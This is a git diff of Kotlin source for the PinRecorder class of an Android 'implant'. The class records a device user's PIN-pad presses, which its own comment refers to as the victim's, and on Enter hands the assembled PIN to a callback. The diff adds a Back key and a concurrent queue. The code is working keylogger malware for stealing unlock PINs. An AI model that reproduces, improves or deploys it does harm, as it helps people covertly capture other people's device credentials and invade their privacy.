@@ -9,49 +9,46 @@
 package com.cooperthecoder.implant
 
 import java.util.*
+import java.util.concurrent.ConcurrentLinkedQueue
 
 class PinRecorder(val callback: (String) -> Unit) {
 
     private object PinPad {
-        @JvmStatic val ONE = "[1]"
-        @JvmStatic val TWO = "[ABC, 2]"
-        @JvmStatic val THREE = "[DEF, 3]"
-        @JvmStatic val FOUR = "[GHI, 4]"
-        @JvmStatic val FIVE = "[JKL, 5]"
-        @JvmStatic val SIX = "[MNO, 6]"
-        @JvmStatic val SEVEN = "[PQRS, 7]"
-        @JvmStatic val EIGHT = "[TUV, 8]"
-        @JvmStatic val NINE = "[WXYZ, 9]"
-        @JvmStatic val ZERO = "[0, +]"
-        @JvmStatic val DELETE = "[Delete]"
-        @JvmStatic val ENTER = "[Enter]"
-        @JvmStatic val EMERGENCY = "[Emergency]"
+        const val ONE = "[1]"
+        const val TWO = "[ABC, 2]"
+        const val THREE = "[DEF, 3]"
+        const val FOUR = "[GHI, 4]"
+        const val FIVE = "[JKL, 5]"
+        const val SIX = "[MNO, 6]"
+        const val SEVEN = "[PQRS, 7]"
+        const val EIGHT = "[TUV, 8]"
+        const val NINE = "[WXYZ, 9]"
+        const val ZERO = "[0, +]"
+        const val DELETE = "[Delete]"
+        const val BACK = "[Back]"
+        const val ENTER = "[Enter]"
+        const val EMERGENCY = "[Emergency]"
     }
 
-    private val digitQueue: Queue<String> = LinkedList<String>()
+    private val digitQueue: Queue<String> = ConcurrentLinkedQueue<String>()
 
     fun appendPinDigit(digit: String) {
         when (digit) {
-            PinPad.DELETE -> {
-                // Remove the last digit logged if the user pressed delete.
+            PinPad.BACK, PinPad.DELETE -> {
                 digitQueue.poll()
             }
-
             PinPad.ENTER -> {
                 // When the victim presses enter, get ready for a new one.
                 callback(digitQueue.joinToString("-"))
                 clearPinQueue()
             }
-
             PinPad.EMERGENCY -> {
                 // Ignore these
             }
-
             else -> {
                 // Otherwise, add the digit to the digitQueue.
                 digitQueue.add(digit)
             }
-
         }
     }
 
